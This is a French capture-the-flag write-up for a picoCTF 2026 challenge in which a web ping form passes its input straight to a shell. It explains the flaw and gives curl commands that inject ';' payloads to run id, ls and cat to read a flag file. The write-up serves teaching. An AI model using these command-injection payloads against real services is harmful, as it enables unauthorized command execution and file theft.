# 757 — ping-cmd

**Événement** : picoCTF 2026 · **Catégorie** : General Skills

## Énoncé

> Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what
> happens if you get a little creative with your input?

Une interface web accepte une adresse IP et exécute un `ping` dessus.

## Analyse

### Le formulaire

La page propose un champ unique, une adresse IP, et un bouton. Une fois soumis, le résultat du `ping`
s'affiche dans la page — statistiques, temps de réponse, perte de paquets. Le comportement est
identique si on poste le champ directement :

```bash
curl -s -d 'ip=8.8.8.8' http://<HOST>:<PORT>/ | head -40
```

### La construction de la commande

L'application concatène l'entrée utilisateur dans une commande shell, du type `ping <input>`, sans
assainissement. Tout métacaractère du shell est donc interprété :

- `;` enchaîne une seconde commande, quel que soit le code de retour de la première ;
- `|`, `||`, `&&` permettent d'autres enchaînements ;
- `` ` `` et `$( )` ouvrent une substitution de commande.

L'injection est « in-band » : la sortie de la commande injectée est renvoyée dans la page, à la suite
des statistiques du ping. Aucun canal externe n'est nécessaire, ce qui rend l'exploitation directe.

### Le répertoire de travail

Un premier `ls` montre que `flag.txt` n'est pas à la racine. Le fichier est dans le répertoire de
travail du script, à côté du code de l'application et d'un `script.txt` qui documente le traitement de
l'entrée.

## Solution

### 1. Reconnaître le point d'injection

Le champ IP part directement au shell. On le confirme sans rien casser, avec un enchaînement
inoffensif :

```bash
curl -s --data-urlencode 'ip=8.8.8.8 ; id' http://<HOST>:<PORT>/ | tail -20
```

La sortie de `id` apparaît dans la réponse HTTP : la commande injectée s'exécute bien.

### 2. Explorer le répertoire courant

```bash
curl -s --data-urlencode 'ip=8.8.8.8 ; ls -la' http://<HOST>:<PORT>/ | tail -30
curl -s --data-urlencode 'ip=8.8.8.8 ; cat script.txt' http://<HOST>:<PORT>/ | tail -30
```

`script.txt` confirme la façon dont l'entrée est traitée — la commande shell complète y apparaît — et
donne le nom exact du fichier de flag.

### 3. Lire le flag

```bash
curl -s --data-urlencode 'ip=8.8.8.8 ; cat flag.txt' http://<HOST>:<PORT>/ | tail -10
```

La sortie de `cat` s'affiche dans la réponse HTTP, après les statistiques du ping.

### 4. Alternative dans le navigateur

Le même payload fonctionne dans le formulaire, à condition d'encoder l'espace et le point-virgule :
`8.8.8.8%20%3B%20cat%20flag.txt`. Avec `curl`, `--data-urlencode` s'en charge et évite les erreurs
d'encodage manuel.

### Pourquoi ça marche

Le shell ne distingue pas une donnée d'une commande : il reçoit une chaîne unique et la découpe sur
les métacaractères. Comme l'application construit cette chaîne par concaténation, l'entrée utilisateur
devient du code. Le `;` est le plus utile ici parce qu'il s'exécute même si le `ping` échoue ou renvoie
un code non nul — contrairement à `&&`.

## Pièges

- **Utiliser `&&` au lieu de `;`.** Si le `ping` renvoie un code d'erreur, la seconde commande n'est
  jamais exécutée ; le `;` est inconditionnel.
- **Chercher `flag.txt` à la racine.** Le fichier est dans le répertoire de travail du script ; il
  faut d'abord `ls` puis lire `script.txt` pour comprendre l'arborescence.
- **Ne pas encoder le payload.** Un espace non encodé coupe la valeur du paramètre et seule une partie
  de la commande arrive au shell.
- **Requête qui semble se bloquer.** Un `ping` non borné dure plusieurs secondes : garder la
  connexion ouverte et augmenter le timeout du client plutôt que de relancer en boucle.
- **Tronquer la sortie.** Le résultat de la commande injectée arrive après les statistiques du ping ;
  un `head` trop court ne montre que le ping.

## Flag

Flag validé sur la plateforme (valeur non conservée).
